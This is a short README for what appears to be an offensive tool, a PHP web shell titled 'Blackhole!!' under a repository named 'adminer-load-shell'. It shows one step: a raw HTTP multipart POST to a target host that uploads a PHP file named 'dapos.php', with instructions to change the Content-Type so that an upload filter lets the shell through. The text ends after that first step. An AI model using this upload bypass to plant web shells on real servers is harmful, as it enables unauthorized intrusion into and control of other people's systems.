# adminer-load-shell


</h1>
<h4 align="center">Blackhole!! PHP WebShell</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>

1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
